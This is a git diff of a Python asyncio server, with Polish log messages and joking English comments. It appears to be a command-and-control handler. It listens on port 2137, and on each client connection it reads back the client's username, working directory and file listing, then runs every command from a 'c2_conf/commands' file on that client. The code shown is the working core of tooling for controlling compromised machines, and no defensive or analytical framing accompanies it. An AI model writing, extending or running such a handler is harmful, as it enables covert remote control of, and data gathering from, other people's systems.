@@ -55,41 +55,47 @@ async def handler(reader,writer):
         except TimeoutError:
             pass
         output = await run_cmd(reader,writer,"whoami", addr, username)
-        username = output.decode().strip()  
+        username = output.decode().strip()                                   #get his username
         print(f"[I] kolega {addr} ma na imie {username}")
+
         pwd = await run_cmd(reader, writer, "pwd", addr, username)
-        pwd = pwd.decode().strip()
+        pwd = pwd.decode().strip()                                                  #get his pwd
         print(f"[I] kolega {username}@{addr} znajduje się w {pwd}")
+
         ls = await run_cmd(reader,writer, "ls", addr, username)
-        ls = ls.decode().strip()
+        ls = ls.decode().strip()                                                   #get his ls
         print(f"[I] ls dla {username}:\n {ls}")
+
         async with open("c2_conf/commands","r") as f:
-            async for line in f:
+            async for line in f:                                                       #run rest of commands
                 await run_cmd(reader,writer,line,addr,username)
 
 
         while True:
-            data_ = await reader.read(1024)
-            if not data_:
+            data_ = await reader.read(100)                                     #not needed - just to make this session alive, can be killed if u want
+            if not data_: 
                 break
-        print(f"[{addr}] Otrzymano: {data_.decode().strip()}")
+
+
+        print(f"[{addr}] Otrzymano: {data_.decode().strip()}")                                #if because of some miracle there will be some data 
 
     except Exception as e:
-        raise(e)
+        raise(e)                                                       #real man wrote this try statement
+    
     finally:
         print(f"[-] zamykanie {addr}")
         writer.close()
-        await writer.wait_closed()
+        await writer.wait_closed()                                      #kill that session
         if addr in sesje: del sesje[addr]
 
 async def main():
     server = await start_server(handler,'0.0.0.0','2137')
     print("[+] Serwer został uruchomiony")
-    async with server:
-        await server.serve_forever()
+    async with server:                         
+        await server.serve_forever()                                                 #with this quality of code - more like 5 seconds 
 
 if __name__ == "__main__":
     try:
         run(main())
-    except KeyboardInterrupt:
+    except KeyboardInterrupt:                                                         #idk, looks nice
         pass
